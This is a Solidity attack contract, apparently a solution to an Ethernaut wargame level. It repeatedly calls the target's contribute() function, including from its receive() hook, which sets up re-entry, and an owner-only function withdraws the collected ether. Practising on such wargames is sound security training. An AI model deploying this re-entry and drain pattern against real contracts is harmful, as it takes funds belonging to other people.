// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;


import "hardhat/console.sol";

contract Attack {
    Ethernaut ethernaut;
    address payable public owner;

    modifier onlyOwner {
        require(msg.sender == owner, "only owner can");
        _;
    }

    constructor(address _ethernaut) payable {
        owner = payable(msg.sender);
        ethernaut = Ethernaut(_ethernaut);
    }

    function attack() external payable {
        ethernaut.contribute{value: 0.0001 ether}();
    }

    receive() external payable {
        ethernaut.contribute{value: 0.0001 ether}();
    }

    function getLoot() external onlyOwner {
        return payable(msg.sender).transfer((address(this).balance));
    }
}

interface Ethernaut {
    function contribute() external  payable;
}
